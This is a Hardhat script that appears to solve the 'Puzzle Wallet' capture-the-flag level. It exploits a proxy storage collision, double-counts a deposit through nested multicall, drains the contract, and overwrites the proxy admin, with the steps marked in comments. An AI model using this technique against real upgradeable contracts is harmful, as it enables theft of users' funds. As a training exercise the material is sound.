/*
Nowadays, paying for DeFi operations is impossible, fact.

A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this.

They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners.

Little did they know, their lunch money was at risk…

  You'll need to hijack this wallet to become the admin of the proxy.

  Things that might help:

Understanding how delegatecall works and how msg.sender and msg.value behaves when performing one.
Knowing about proxy patterns and the way they handle storage variables.
*/


const hre = require("hardhat");

async function main() {

	const [deployer, signer0, signer1] = await hre.ethers.getSigners();
	console.log("Deployer:", deployer.address);

	const contractAddress = "0x256Fa81B3b8Abe149EfA4187dA0274237aD814Bf";
	const contract = await hre.ethers.getContractAt("PuzzleWallet", contractAddress, deployer);

	// const maxBalance = await contract.maxBalance()
	// console.log("Max balance:", maxBalance);
	// console.log("Max balance as address:", maxBalance.toHexString());
	// const owner = await contract.owner();
	// console.log("Owner:", owner);
	// console.log("Is owner whitelsited:", await contract.whitelisted(owner));
	// console.log("Balance of owner:", await contract.balances(owner));
	// console.log("Is deployer whitelsited:", await contract.whitelisted(deployer.address));
	// console.log("Balance of deployer:", await contract.balances(deployer.address));
	// console.log("Is owner a contract:", await hre.ethers.provider.getCode(owner) !== "0x");

	const proxyContract = await hre.ethers.getContractAt("PuzzleProxy", contractAddress , deployer);
	console.log("Proxy admin:", await proxyContract.admin());
	console.log("Pending admin:", await proxyContract.pendingAdmin());

	// STEP 1
	// const txn = await proxyContract.proposeNewAdmin(deployer.address);
	// await txn.wait();

	// STEP 2
	// const txn = await contract.addToWhitelist(deployer.address);
	// await txn.wait();

	const value = hre.ethers.utils.parseEther("0.00099");

	/* Hardhat */

	// const contract = await hre.ethers.deployContract("PuzzleWallet", [], signer0);
	// console.log("Contract deployed to:", contract.address);
	// await contract.init(hre.ethers.BigNumber.from("0xb4B157C7c4b0921065Dded675dFe10759EecaA6D"));
	// await contract.addToWhitelist(signer0.address);
	// await contract.deposit({value});
	// await contract.addToWhitelist(deployer.address);

	// const myContract = await hre.ethers.getContractAt("PuzzleWallet", contract.address, deployer);
	// console.log("Is deployer whitelisted:", await myContract.whitelisted(deployer.address));

	console.log("Contract balance:", (await hre.ethers.provider.getBalance(contract.address)).toString());

	/* Hardhat END */

	const depositCalldata = contract.interface.encodeFunctionData("deposit", []);
	const executeCalldata = contract.interface.encodeFunctionData("execute", [deployer.address, value, "0x"]);
	const multicallCalldata = contract.interface.encodeFunctionData("multicall", [[depositCalldata]]);

	const data = [depositCalldata, multicallCalldata, executeCalldata, executeCalldata];
	// STEP 3 - make my balances mapping more while not actually depositing value
	// const txn = await contract.multicall(data, {value});
	// await txn.wait();

	// STEP 4
	// const txn = await contract.setMaxBalance(hre.ethers.BigNumber.from(deployer.address));
	// await txn.wait();
	console.log("Max balance:", await contract.maxBalance(), (await contract.maxBalance()).toHexString());
	console.log("Proxy admin:", await proxyContract.admin());
	console.log("Pending admin:", await proxyContract.pendingAdmin());

}

main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
